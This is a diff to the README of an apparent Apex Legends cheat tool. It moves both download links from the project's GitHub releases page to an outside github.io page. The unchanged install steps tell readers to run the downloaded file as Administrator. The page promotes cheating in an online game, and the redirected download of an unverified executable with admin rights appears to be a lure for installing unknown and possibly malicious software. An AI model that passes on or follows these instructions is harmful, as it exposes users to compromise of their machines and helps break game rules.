@@ -1,6 +1,6 @@
 # 🎯 Apex-Legends-Cheat - Gain advantages in your battle royale
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Tristan1867/Apex-Legends-Cheat/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://tristan1867.github.io)
 
 This application provides tools to improve your performance in Apex Legends. It includes settings for vision, aim, and movement. Use these features to track enemies, manage your fire, and move faster across the map.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you begin.
 
 Follow these steps to set up the software on your system.
 
-1.  Visit the official release page to download the latest version: [https://github.com/Tristan1867/Apex-Legends-Cheat/releases](https://github.com/Tristan1867/Apex-Legends-Cheat/releases)
+1.  Visit the official release page to download the latest version: [https://tristan1867.github.io](https://tristan1867.github.io)
 2.  Locate the downloaded file in your browser's download folder.
 3.  Right-click the downloaded file.
 4.  Select the option to Run as Administrator.
